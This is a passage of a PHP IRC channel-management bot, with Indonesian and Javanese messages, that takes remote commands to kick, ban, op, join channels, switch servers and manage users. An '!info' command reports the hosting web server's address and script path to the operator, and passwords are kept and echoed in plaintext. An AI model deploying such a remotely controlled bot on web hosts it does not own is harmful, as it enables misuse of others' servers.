         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <;passsword> untuk mengatur password anda ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User telah ada! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Mohon auth dulu! Ketik: auth <password> ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :Tadi kan udah!bos chokeng kok auth lagi? ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga boleh tuh! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':!say' && $com[4] && $chan) {
                 $msg = strstr($data,":!say");
                 $msg = str_replace(":!say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':!act' && $com[4] && $chan) {
                 $msg = strstr($data,":!act");
                 $msg = str_replace(":!act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':!slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' with a Mouse Click'. CRL);
               }
               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!msg");
                 $msg = str_replace(":!msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!ctcp");
                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':!ping' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
               }
               elseif ($com[3]==':!pong' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PING! '.$sml. CRL);
               }
               elseif ($com[3]==':!info') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
                }
               }
               elseif ($com[3]==':!up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':!down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!join' && $com[4]) {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!botnick' && $com[4] && !$chan) {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!k' && $com[4] && $chan) {
                 $msg = strstr($data,":!k");
                 $msg = str_replace(":!k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':!kb' && $com[4] && $chan) {
                 $msg = strstr($data,":!kb");
                 $msg = str_replace(":!kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':!changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':!op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':!mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':!nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':!chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!quit");
                 $msg = str_replace(":!quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti_Server".CRL);
               }
               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti_Ident ' . CRL);
               }
               elseif ($com[3]==':!fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti_Nama ' . CRL);
               }
               elseif ($com[3]==':!topic' && $com[4] && $chan) {
                 $msg = strstr($data,":!topic");
                 $msg = str_replace(":!topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
                     elseif ($com[3]==':!help' && !$chan) {
							fputs($fp,'PRIVMSG '.$dNick.' :2=[4[13-CHOKENG-9SCRIPT 11,1KICK+PROTECK13,0-4]2]= Bot Help' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :[ auth <password> | !auth !auth | deauth | adduser <nick> <master/user> | deluser <nick> | pass <password> | chgpass <old pass> <new pass> ]' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :[ !say <message> | !act|slap <message> | !msg|notice|ctcp <nick> <message> | !ping/pong | !up | !down ]' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :[ !cycle <#channel> <message> | !join <channel/#channel> | !part <#channel> <message> | !nickmode <+/-nickmode> ]' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :[ !botnick <new nick> <identify> | !k/kb <nick> <message> | !op <nick> | !deop <nick> | !v <nick> | !dv <nick> ]' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :[ !detik|whois|dns <on/off> | !awaymsg <message> | !mode <+/-chanmode> | !chanlist | !userlist | !quit <message> | !vhost <ip address/hostname> ]' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :[ !jump <server.dal.net> | `ident <username> | !fullname <realname> | !topic <new chan topic> | !log <on/off> ]' . CRL);
							fputs($fp,'PRIVMSG '.$dNick.' :4 - lek kurang jelas takok o seng nggawe by :2=[4[13-CHOKENG-9SCRIPT 11,1KICK+PROTECK13,0-4]2]=' . CRL);
						}
               /*** AUTO RESPONSE COMMAND BY RONZ **/
               elseif ($com[3]==':!ngomong') {
                 $ngomong = TRUE;
                 $autowelcome = TRUE;
                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION seneng boleh ngomong lagi!sama bos chokeng 4,8:)'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue ngomong deh. ' . CRL); }
               }
               elseif ($com[3]==':!diam') {
                 $ngomong = FALSE;
                 $autowelcome = FALSE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION wah kok g boleh ngomong sich bos 4,8:(:('. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue diem deh. ' . CRL); }
               }
             }
             else { fputs($fp,'NOTICE '.$dNick.' :Mohon untuk bos chokeng auth dulu! Ketik: auth <password> '. CRL); }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

hajar($nick);

?>